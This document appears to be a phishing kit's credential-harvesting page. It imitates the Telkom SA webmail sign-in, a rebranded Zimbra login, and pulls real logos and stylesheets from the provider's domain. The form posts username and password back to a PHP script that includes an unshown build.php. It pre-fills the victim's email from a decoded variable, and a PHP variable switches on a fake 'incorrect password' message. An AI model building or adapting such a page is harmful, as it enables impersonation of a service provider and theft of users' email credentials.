<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<!-- set this class so CSS definitions that now use REM size, would work relative to this.
	Since now almost everything is relative to one of the 2 absolute font size classese -->
<html class="user_font_size_normal" lang="en">
<head>
<!--
 login.jsp
 * ***** BEGIN LICENSE BLOCK *****
 * Zimbra Collaboration Suite Web Client
 * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
 *
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software Foundation,
 * version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License along with this program.
 * If not, see <https://www.gnu.org/licenses/>.
 * ***** END LICENSE BLOCK *****
-->
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<!--	<title>Zimbra Web Client Sign In</title> -->
	<title>Telkom Internet web client </title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes" />
	<meta name="apple-mobile-web-app-status-bar-style" content="black" />
	<link rel="stylesheet" type="text/css" href="https://webmail.telkomsa.net/mail/css/common,login,zhtml,skin.css?skin=harmony&v=260427132340">
	<link rel="SHORTCUT ICON" href="https://webmail.telkomsa.net/mail/img/logo/favicon.ico">


</head>
<body onload="onLoad();">

	<div class="LoginScreen">
	<nav class="navbar navbar-expand-lg login-navbar" style = "background-color: #007cc3;" role="navigation">
	<a class="navbar-brand" href="#">
		<img src="https://webmail.telkomsa.net/skins/_base/logos/TelkomSA-logo.png" alt="logo"> 
	</a>
</nav>
	
		<div class="center">
			<div class="contentBox">
				<!-- <h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span> 
				
					<span class="ImgLoginBanner"></span>
				</a></h1> -->
				<h1 style = "padding:15px; font-weight:600; color:white">Telkom Internet Mail</h1>

				
				<div id="ZLoginAppName">Web Client</div>
                <div id="ZLoginErrorPanel" style="<?php echo $error; ?>">
						<table><tbody><tr>
							<td><img src="https://webmail.telkomsa.net/img/dwt/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon"></td>
							<td>The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current username and password.</td>
						</tr></tbody></table>
					</div>
				<form method="post" name="loginForm" action="" accept-charset="UTF-8">
								<input type="hidden" name="login" value="telkomsa"/>
								<table class="form">
                        <tr>
                                        <td><label for="username">Username:</label></td>
                                        <td><input id="username" class="zLoginField" name="user" type="text" placeholder="<?php echo htmlspecialchars($decoded); ?>" value="<?php echo htmlspecialchars($decoded); ?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
                                        </tr>
                                        <tr>
                                <td><label for="password">Password:</label></td>
                                <td><input id="password" autocomplete="off" class="zLoginField" name="pass" type="text" value="" size="40" maxlength="1024"/></td>
                                </tr>
                                <tr>
                                <td>&nbsp;</td>
                                <td class="submitTD">
                                <input id="remember" value="1" type="checkbox" name="zrememberme" />
                                    <label for="remember">Stay signed in</label>
                                <input type="submit" class="ZLoginButton DwtButton" value="Sign In" />
                                </td>
                                </tr>
			
				<tr >
                            <td colspan="2"><hr/></td>
                            </tr>
                            <tr >
                            <td>
                            <label for="client">Version:</label>
                            </td>
                            <td>
                            <div class="positioning">
                            <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                    <option value="preferred" selected > Default</option>
                                    <option value="advanced" > Classic</option>
                                    <option value="standard" > ???clientStandard???</option>
                                    <option value="mobile" > Mobile</option>
                                    </select>
                                <script TYPE="text/javascript">
                        document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
                        </script>
                        <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip"><p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings > General > Zimbra Version. In Classic, set it in Preferences > General > Sign In.</p></div>
                        <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
                        </div>
                        </td>
                        </tr>
                        </table>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<!-- <div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a></div>
			<div class="copyright">
			Copyright © 2005-2026 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
		</div> -->

		<div class="Footer">


			
<footer class="page-footer font-small">




  <!-- Copyright -->
  <div class="footer-copyright text-white text-center py-3" style = "background-color: #007cc3;"> Copyright Telkom SA SOC Limited. 2020 . All Rights Reserved.
        
        <img src="https://webmail.telkomsa.net/skins/_base/logos/TelkomSA-logo.png" alt="logo" style="float: right;padding-right: 17px;padding-bottom: 7px;">
  </div>
  <!-- Copyright -->

</footer>



	<!--
		<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="http://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="http://blog.zimbra.com">Blog</a> - <a target="_new" href="http://wiki.zimbra.com">Wiki</a> - <a target="_new" href="http://www.zimbra.com/forums">Forums</a></div>
        
        <div class="copyright">
            Copyright  2005-2014 Telligent Systems, Inc. All rights reserved. "Telligent" and "Zimbra" are registered trademarks or trademarks of Telligent Systems, Inc.
            </div> -->
        </div>

		<div class="decor2"></div>
	</div>

<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<!-- Popper JS -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
